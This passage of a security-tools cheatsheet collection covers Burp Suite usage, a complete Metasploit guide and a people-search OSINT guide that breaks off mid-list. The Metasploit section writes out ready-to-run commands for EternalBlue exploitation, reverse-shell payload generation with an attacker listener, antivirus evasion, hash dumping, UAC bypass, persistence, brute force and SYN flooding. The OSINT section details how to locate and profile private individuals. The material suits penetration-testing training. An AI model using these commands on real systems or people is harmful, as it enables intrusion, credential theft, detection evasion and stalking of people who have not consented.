- Very poor: Token may be guessable
```

---

## 🕸 Burp Suite — 🧩 Extensions

### BApp Store

```
Extender → BApp Store

Popular extensions:
```

### Must-Have Extensions

| Extension | Description |
|-----------|-------------|
| **Autorize** | Authorization testing |
| **Logger++** | Enhanced logging |
| **Retire.js** | Detect vulnerable JS libraries |
| **Active Scan++** | Additional scan checks |
| **AuthMatrix** | Authorization matrix testing |
| **Turbo Intruder** | Fast Intruder alternative |
| **Param Miner** | Hidden parameter discovery |
| **JSON Web Tokens** | JWT analysis/manipulation |
| **Hackvertor** | Advanced encoding/decoding |
| **CO2** | Suite of useful tools |

### Installing Extensions

```
Method 1: BApp Store
1. Extender → BApp Store
2. Find extension
3. Click Install

Method 2: Manual
1. Download .jar or .py file
2. Extender → Extensions → Add
3. Select file type and path
```

### Extension Settings

```
Extender → Options

- Python environment (for Python extensions)
- Java environment settings
- Logging options
```

---

## 🕸 Burp Suite — ⌨️ Keyboard Shortcuts

### Global Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+I` | Send to Intruder |
| `Ctrl+R` | Send to Repeater |
| `Ctrl+S` | Search |
| `Ctrl+F` | Forward (Proxy) |
| `Ctrl+D` | Drop (Proxy) |
| `Ctrl+T` | Toggle Intercept |
| `Ctrl+Shift+T` | Toggle Proxy intercept |

### Tab Navigation

| Shortcut | Action |
|----------|--------|
| `Ctrl+Shift+D` | Dashboard |
| `Ctrl+Shift+T` | Target |
| `Ctrl+Shift+P` | Proxy |
| `Ctrl+Shift+I` | Intruder |
| `Ctrl+Shift+R` | Repeater |

### In Repeater

| Shortcut | Action |
|----------|--------|
| `Ctrl+Space` | Send request |
| `Ctrl+G` | Go to (request history) |
| `Ctrl+Plus` | New tab |

### In Editor

| Shortcut | Action |
|----------|--------|
| `Ctrl+U` | URL encode selection |
| `Ctrl+Shift+U` | URL decode selection |
| `Ctrl+B` | Base64 encode |
| `Ctrl+Shift+B` | Base64 decode |

---

## 🕸 Burp Suite — 🎯 Testing Workflow

### Standard Web App Test Flow

```
Step 1: Setup
├── Configure browser proxy
├── Install SSL certificate
└── Define scope

Step 2: Reconnaissance
├── Browse application manually
├── Run Spider/Crawler
└── Review Site map

Step 3: Analysis
├── Check Proxy history
├── Review passive scan results
└── Identify attack surface

Step 4: Testing
├── Test with Repeater (manual)
├── Test with Intruder (automated)
├── Run active scan
└── Use extensions

Step 5: Reporting
├── Review all findings
├── Generate report
└── Document evidence
```

### Testing Checklist

```
Authentication:
□ Brute force login
□ Password policy
□ Account lockout
□ Session management
□ Remember me function

Authorization:
□ IDOR testing
□ Privilege escalation
□ Function level access

Input Validation:
□ SQL injection
□ XSS (reflected/stored/DOM)
□ Command injection
□ File upload
□ XXE

Session:
□ Session fixation
□ Session timeout
□ Token randomness

Business Logic:
□ Price manipulation
□ Workflow bypass
□ Race conditions
```

---

## 🕸 Burp Suite — 📊 Quick Reference

### Tool Summary

| Tool | Primary Use | Key Shortcut |
|------|-------------|--------------|
| Proxy | Intercept traffic | Ctrl+T (toggle) |
| Repeater | Manual testing | Ctrl+R (send to) |
| Intruder | Automated attacks | Ctrl+I (send to) |
| Scanner | Find vulnerabilities | Right-click → Scan |
| Spider | Discover content | Right-click → Spider |
| Decoder | Encode/Decode | - |
| Comparer | Diff responses | Send to Comparer |
| Sequencer | Token analysis | Send to Sequencer |

### Intruder Attack Types Quick Reference

| Attack | Use When |
|--------|----------|
| **Sniper** | Testing one parameter at a time |
| **Battering Ram** | Same payload everywhere |
| **Pitchfork** | Username:password pairs |
| **Cluster Bomb** | All username × password combinations |

### Common Status Codes

| Code | Meaning | Intruder Significance |
|------|---------|----------------------|
| 200 | OK | Normal response |
| 301/302 | Redirect | May indicate success |
| 401 | Unauthorized | Bad credentials |
| 403 | Forbidden | Access denied |
| 404 | Not found | Invalid path |
| 500 | Server error | Possible vulnerability |

---

## 🕸 Burp Suite — 💡 Tips & Best Practices

### Performance Tips

1. **Limit Scope**
   ```
   Only keep target domains in scope
   Reduces noise in Proxy history
   ```

2. **Disable Extensions**
   ```
   Disable unused extensions for performance
   ```

3. **Use Project Files**
   ```
   Save work frequently
   Use project files for large tests
   ```

### Testing Tips

1. **Start Passive**
   ```
   Let passive scanner find low-hanging fruit
   Review before active scanning
   ```

2. **Use Repeater First**
   ```
   Manual testing reveals more
   Understand the application before automation
   ```

3. **Organize with Tabs**
   ```
   Name Repeater tabs meaningfully
   Use Intruder attack names
   ```

### Avoiding Detection

```
Settings for stealth:

Project options → Connections:
- Throttle requests
- Random delays
- Concurrent connections limit

Intruder → Options:
- Request delay
- Start time
```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Can't intercept HTTPS | Install CA certificate |
| Slow performance | Reduce scope, disable extensions |
| Missing requests | Check "Intercept Server Responses" |
| Scanner not finding vulns | Increase scan intensity |

---

## 🕸 Burp Suite — 📚 Resources

### Official Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [BApp Store](https://portswigger.net/bappstore)

### Learning Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Related Cheatsheets
- [SQLMap](../SQLMap/README.md)
- [Metasploit Framework](../Metasploit/README.md)

---

<p align="center">
  <b>🔶 Master Web Application Security Testing!</b><br>
  <i>The best way to learn is by doing - set up a lab and practice!</i>
</p>

## 💀 Metasploit — # 🔴 Metasploit Framework - Complete Cheatsheet

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **The world's most used penetration testing framework** - Your complete guide to mastering Metasploit

---

## 💀 Metasploit — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Architecture Overview](#-architecture-overview)
- [Starting Metasploit](#-starting-metasploit)
- [Basic Commands](#-basic-commands)
- [Module Types](#-module-types)
- [Exploitation Workflow](#-exploitation-workflow)
- [Database Integration](#-database-integration)
- [Scanning & Enumeration](#-scanning--enumeration)
- [Payload Generation (msfvenom)](#-payload-generation-msfvenom)
- [Post-Exploitation](#-post-exploitation)
- [Auxiliary Modules](#-auxiliary-modules)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference Tables](#-quick-reference-tables)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 💀 Metasploit — 📥 Installation

### Kali Linux (Pre-installed)
```bash
# Update Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Install dependencies
sudo apt install curl gnupg2 software-properties-common

# Add Metasploit repository
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (Not Recommended for Production)
```powershell
# Download installer from: https://windows.metasploit.com/
# Run the installer and follow instructions
```

---

## 💀 Metasploit — 🚀 Starting Metasploit

### Initialize Database (First Time)
```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Initialize the database
sudo msfdb init

# Check database status
sudo msfdb status
```

### Launch msfconsole
```bash
# Standard launch
msfconsole

# Quiet mode (no banner)
msfconsole -q

# Execute commands on startup
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Load resource file
msfconsole -r commands.rc
```

---

## 💀 Metasploit — ⌨️ Basic Commands

### Navigation & Help

| Command | Description |
|---------|-------------|
| `help` or `?` | Display help menu |
| `help <command>` | Help for specific command |
| `search <term>` | Search modules by name/CVE/platform |
| `use <module>` | Select a module |
| `back` | Exit current module |
| `info` | Display module information |
| `show options` | Show module options |
| `show advanced` | Show advanced options |
| `show payloads` | List compatible payloads |
| `show targets` | List available targets |

### Module Configuration

```bash
# Set options
set RHOSTS 192.168.1.100          # Target IP
set RPORT 445                      # Target port
set LHOST 192.168.1.50            # Local IP (attacker)
set LPORT 4444                     # Local port (listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Set globally (persists across modules)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Unset options
unset RHOSTS
unsetg LHOST

# Check current settings
show options
check                              # Verify if target is vulnerable
```

### Execution

```bash
# Run the exploit
exploit
run

# Run in background
exploit -j

# Run with specific options
exploit -z                         # Don't interact with session after success
```

### Session Management

```bash
# List sessions
sessions
sessions -l

# Interact with session
sessions -i 1

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Upgrade shell to Meterpreter
sessions -u 1

# Run command on all sessions
sessions -c "sysinfo"
```

---

## 💀 Metasploit — 📦 Module Types

### 1. Exploits
Modules that take advantage of vulnerabilities.

```bash
# Search exploits
search type:exploit platform:windows

# Example
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Code executed after successful exploitation.

**Types:**
- **Singles** - Self-contained payloads
- **Stagers** - Set up connection between attacker and target
- **Stages** - Downloaded by stagers (Meterpreter)

```bash
# List payloads
show payloads

# Payload naming convention
<platform>/<arch>/<type>/<connection>
# Example: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliary
Scanning, fuzzing, sniffing, and more.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Post-exploitation modules.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encoders
Encode payloads to evade detection.

```bash
show encoders
# Example: x86/shikata_ga_nai
```

---

## 💀 Metasploit — 🎯 Exploitation Workflow

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON &    │───▶│    SELECT    │───▶│  CONFIGURE   │
│  ENUMERATION │    │    MODULE    │    │   OPTIONS    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   EXPLOIT    │◀───│    CHECK     │
│ EXPLOITATION │    │    TARGET    │    │    TARGET    │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Step-by-Step Example

```bash
# 1. Search for exploit
msf6 > search eternalblue

# 2. Select module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. View options
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Set target
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Set payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Set listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verify vulnerability (optional)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Execute
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

## 💀 Metasploit — 🗄️ Database Integration

### Setup & Connection

```bash
# Initialize database
msfdb init

# Connect to database
db_connect msf:password@127.0.0.1/msf

# Check status
db_status

# Disconnect
db_disconnect
```

### Workspace Management

```bash
# List workspaces
workspace

# Create workspace
workspace -a pentest_project

# Switch workspace
workspace pentest_project

# Delete workspace
workspace -d old_project

# Rename workspace
workspace -r old_name new_name
```

### Host Management

```bash
# List hosts
hosts

# Add host manually
hosts -a 192.168.1.100

# Delete host
hosts -d 192.168.1.100

# Search hosts
hosts -S windows

# Export hosts
hosts -o /tmp/hosts.csv
```

### Service Management

```bash
# List services
services

# Filter by port
services -p 80,443

# Filter by service name
services -s http

# Search services
services -S microsoft
```

### Vulnerability Management

```bash
# List vulnerabilities
vulns

# Add vulnerability
vulns -a 192.168.1.100 -n "MS17-010"
```

### Import/Export

```bash
# Import Nmap scan
db_import /path/to/nmap_scan.xml

# Import Nessus scan
db_import /path/to/nessus_scan.nessus

# Run Nmap directly
db_nmap -sV -O 192.168.1.0/24

# Export data
hosts -o hosts.csv
services -o services.csv
```

---

## 💀 Metasploit — 🔍 Scanning & Enumeration

### Port Scanning

```bash
# TCP SYN scan
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# TCP connect scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Service Enumeration

```bash
# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP version
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP enumeration
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Vulnerability Scanning

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# HTTP vulnerability scanner
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💀 Metasploit — 💉 Payload Generation (msfvenom)

### Basic Syntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Common Options

| Option | Description |
|--------|-------------|
| `-p` | Payload to use |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder to use |
| `-i` | Encoding iterations |
| `-b` | Bad characters to avoid |
| `-n` | NOP sled size |
| `--platform` | Target platform |
| `-a` | Architecture |
| `LHOST` | Listener IP |
| `LPORT` | Listener port |

### Windows Payloads

```bash
# Reverse TCP (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Reverse TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Reverse HTTPS (Encrypted)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# With encoding (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Linux Payloads

```bash
# Reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Reverse TCP (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Bind shell
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Web Payloads

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Scripting Payloads

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (Macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Android Payloads

```bash
# Android reverse TCP
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### macOS Payloads

```bash
# macOS reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Multi/Handler Setup

```bash
# Start listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 💀 Metasploit — 🔓 Post-Exploitation

### Basic Post Modules

```bash
# Get system info
use post/windows/gather/enum_system

# Get logged in users
use post/windows/gather/enum_logged_on_users

# Dump password hashes
use post/windows/gather/hashdump

# Credentials from memory
use post/windows/gather/credentials/credential_collector

# Check VM
use post/windows/gather/checkvm
```

### Privilege Escalation

```bash
# Windows escalation suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC bypass
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Get SYSTEM
use post/windows/escalate/getsystem
```

### Persistence

```bash
# Registry persistence
use exploit/windows/local/persistence_service
set SESSION 1
run

# Scheduled task persistence
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 💀 Metasploit — 🔧 Auxiliary Modules

### Brute Force

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Sniffing

```bash
# HTTP password sniffer
use auxiliary/sniffer/psnuffle
run

# Capture packets
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (Testing Only)

```bash
# SYN flood
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 💀 Metasploit — 🎬 Real-World Examples

### Example 1: EternalBlue Attack (MS17-010)

```bash
# Start Metasploit
msfconsole -q

# Search for exploit
search eternalblue

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Check if vulnerable
check

# Exploit
exploit
```

### Example 2: Web Application Attack

```bash
# Scan for vulnerabilities
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Exploit file upload
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Example 3: Multi-Handler with msfvenom

```bash
# Terminal 1: Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: Start handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Transfer payload.exe to target and execute
# Session will connect to handler
```

### Example 4: Pivoting Through Compromised Host

```bash
# After getting Meterpreter session
meterpreter > run autoroute -s 10.10.10.0/24

# Or from msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Now scan internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 💀 Metasploit — 📊 Quick Reference Tables

### Essential Commands

| Command | Description |
|---------|-------------|
| `search <term>` | Search for modules |
| `use <module>` | Select module |
| `show options` | Display options |
| `set <opt> <val>` | Set option value |
| `exploit` / `run` | Execute module |
| `back` | Return to main |
| `sessions -l` | List sessions |
| `sessions -i <id>` | Interact with session |

### Common Payloads

| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter (32-bit) |
| `windows/x64/meterpreter/reverse_tcp` | Windows Meterpreter (64-bit) |
| `windows/meterpreter/reverse_https` | Encrypted connection |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java/JSP shell |
| `android/meterpreter/reverse_tcp` | Android Meterpreter |

### Output Formats (msfvenom)

| Format | Extension | Use Case |
|--------|-----------|----------|
| `exe` | .exe | Windows executable |
| `elf` | (none) | Linux executable |
| `macho` | (none) | macOS executable |
| `raw` | varies | Raw shellcode |
| `asp` | .asp | IIS web server |
| `aspx` | .aspx | .NET web server |
| `php` | .php | PHP web server |
| `jsp` | .jsp | Java web server |
| `war` | .war | Tomcat deployment |
| `psh` | .ps1 | PowerShell script |
| `vba` | .vba | Office macro |
| `dll` | .dll | Windows library |

### Popular Encoders

| Encoder | Description |
|---------|-------------|
| `x86/shikata_ga_nai` | Polymorphic XOR encoder |
| `x64/xor` | XOR encoder (64-bit) |
| `x86/alpha_mixed` | Alphanumeric encoder |
| `php/base64` | Base64 PHP encoder |

---

## 💀 Metasploit — 💡 Tips & Best Practices

### ⚠️ Legal Disclaimer
> **IMPORTANT:** Only use Metasploit against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

### Performance Tips

1. **Use Database**
   ```bash
   # Always initialize and use database
   msfdb init
   db_status
   ```

2. **Use Workspaces**
   ```bash
   workspace -a client_pentest
   ```

3. **Resource Scripts**
   ```bash
   # Save commands to .rc file
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Run script
   msfconsole -r handler.rc
   ```

4. **Use Threads Wisely**
   ```bash
   set THREADS 10  # Don't overwhelm the target
   ```

### Evasion Techniques

1. **Multiple Encodings**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Custom Templates**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Use HTTPS Payloads**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Database not connecting | `msfdb reinit` |
| Module not loading | `reload_all` |
| Session dies immediately | Check AV, use encoded payload |
| Exploit fails | Check target OS version, try different target |

---

## 💀 Metasploit — 📚 Resources

### Official Documentation
- [Metasploit Docs](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

### Learning Resources
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Cheatsheets
- [SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter Cheatsheet](./Meterpreter.md)

---

## 🔎 OSINT — # 👤 People Search OSINT

```
██████╗ ███████╗ ██████╗ ██████╗ ██╗     ███████╗
██╔══██╗██╔════╝██╔═══██╗██╔══██╗██║     ██╔════╝
██████╔╝█████╗  ██║   ██║██████╔╝██║     █████╗  
██╔═══╝ ██╔══╝  ██║   ██║██╔═══╝ ██║     ██╔══╝  
██║     ███████╗╚██████╔╝██║     ███████╗███████╗
╚═╝     ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝
███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗ 
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║ 
███████╗█████╗  ███████║██████╔╝██║     ███████║ 
╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║ 
███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║ 
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 
```

---

## 🔎 OSINT — 🔍 People Search Engines

### Free Services
| Tool | URL | Coverage |
|------|-----|----------|
| **ThatsThem** | thatsthem.com | US |
| **FastPeopleSearch** | fastpeoplesearch.com | US |
| **TruePeopleSearch** | truepeoplesearch.com | US |
| **Webmii** | webmii.com | Global |
| **PeekYou** | peekyou.com | US |
| **Pipl** | pipl.com | Global |

### Paid Services
| Tool | URL | Features |
|------|-----|----------|
| **Spokeo** | spokeo.com | Deep search, social media |
| **BeenVerified** | beenverified.com | Background checks |
| **Intelius** | intelius.com | Criminal records |
| **US Search** | ussearch.com | Court records |
| **Radaris** | radaris.com | Property records |

---

## 🔎 OSINT — 🔎 Google Dorking for People

### Basic Searches
```
# Name search
"John Smith" site:linkedin.com
"John Smith" site:facebook.com
"John Smith" site:twitter.com

# Name + Location
"John Smith" "New York"
"John Smith" "NYC" OR "New York City"

# Name + Company
"John Smith" "Microsoft"
"John Smith" site:microsoft.com

# Name + Email
"John Smith" "@gmail.com"
"John Smith" email
```

### Professional Info
```
# Resume/CV search
"John Smith" filetype:pdf resume
"John Smith" filetype:doc CV
intitle:"curriculum vitae" "John Smith"

# LinkedIn specific
site:linkedin.com/in "John Smith"
site:linkedin.com "John Smith" "Software Engineer"

# Professional profiles
site:about.me "John Smith"
site:crunchbase.com "John Smith"
```

### Social Media Discovery
```
# Find all profiles
"John Smith" (site:facebook.com OR site:twitter.com OR site:instagram.com)

# Username search
"johnsmith123" site:twitter.com
"johnsmith123" site:reddit.com
"johnsmith123" site:github.com
```

---

## 🔎 OSINT — 🛠️ Command Line Tools

### Sherlock (Username Search)
```bash
# Install
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
pip3 install -r requirements.txt

# Search username across platforms
python3 sherlock username

# Multiple usernames
python3 sherlock user1 user2 user3

# Specific sites only
python3 sherlock username --site twitter instagram facebook

# Export results
python3 sherlock username --output results.txt
python3 sherlock username --csv
python3 sherlock username --xlsx
```

### Maigret (Enhanced Username Search)
```bash
# Install
pip3 install maigret

# Search
maigret username

# With Tor
maigret username --tor

# JSON output
maigret username --json results.json
```

### holehe (Email Registration Check)
```bash
# Install
pip3 install holehe

# Check email across services
holehe email@example.com

# Only show registered sites
holehe email@example.com --only-used
```

---

## 🔎 OSINT — 📧 Email to Person

### Find Person from Email
```
1. Search email in Google: "email@example.com"
2. Check HIBP: haveibeenpwned.com
3. Search in breach databases
4. Check social media registrations
5. Reverse email lookup services
```

### Email Format Discovery
```bash
# Common email formats
first.last@company.com
flast@company.com
firstl@company.com
first_last@company.com
first@company.com

# Hunter.io format finder
https://hunter.io/email-finder
```

---

## 🔎 OSINT — 📱 Phone Number OSINT

### Phone Lookup Services
| Service | URL | Type |
|---------|-----|------|
| **TrueCaller** | truecaller.com | Caller ID |
| **Sync.me** | sync.me | Caller ID |
| **NumLookup** | numlookup.com | Free lookup |
| **SpyDialer** | spydialer.com | Reverse lookup |
| **CallerID Test** | calleridtest.com | Carrier info |

### Phone Number Google Dorks
```
# Basic search
"555-123-4567"
"+1 555 123 4567"
"5551234567"

# Find associated info
"555-123-4567" site:facebook.com
"555-123-4567" "@"
"555-123-4567" "email"
```

### OSINT on Phone Numbers
```bash
# phoneinfoga
pip3 install phoneinfoga
phoneinfoga scan -n "+1234567890"
phoneinfoga serve -p 8080  # Web interface

# Using APIs
curl "https://api.numlookupapi.com/v1/validate/14155551234?apikey=YOUR_KEY"
```

---

## 🔎 OSINT — 🏠 Address & Property Records

### Property Search
| Service | URL | Coverage |
|---------|-----|----------|
| **Zillow** | zillow.com | US |
| **Redfin** | redfin.com | US |
| **County Assessor** | [varies] | Local records |
| **Whitepages** | whitepages.com | US |

### Public Records
```
# Court records
PACER (pacer.gov) - Federal courts
State court websites - State courts

# Voter records
Voter registration databases (varies by state)

# Business registrations
State Secretary of State websites
```

---

## 🔎 OSINT — 👥 Social Network Analysis

### LinkedIn OSINT
```
# Profile search
site:linkedin.com/in "John Smith"
site:linkedin.com/in "John Smith" "Company Name"

# Find connections
Check "People Also Viewed"
Check mutual connections
Company employees list
```

### Facebook OSINT
```
# Profile URLs
facebook.com/search/people/?q=john%20smith
facebook.com/search/pages/?q=john%20smith

# Graph search (limited now)
People named "John" who work at "Company"
People who live in "City" and like "Page"
```

### Tools for Social Analysis
```bash
# Social Analyzer
pip3 install social-analyzer
social-analyzer --username "target" --metadata

# Twint (Twitter)
pip3 install twint
twint -u username --followers
twint -u username --following
```

---

## 🔎 OSINT — 📸 Photo/Face Search

### Reverse Image Search
| Service | URL | Best For |
|---------|-----|----------|
| **Google Images** | images.google.com | General |
| **TinEye** | tineye.com | Exact matches |
| **Yandex** | yandex.com/images | Best for faces |
| **Bing Images** | bing.com/images | Good alternative |
| **PimEyes** | pimeyes.com | Facial recognition |

### Face Search
```
1. Yandex Images - Best for finding faces
2. PimEyes - Paid facial recognition
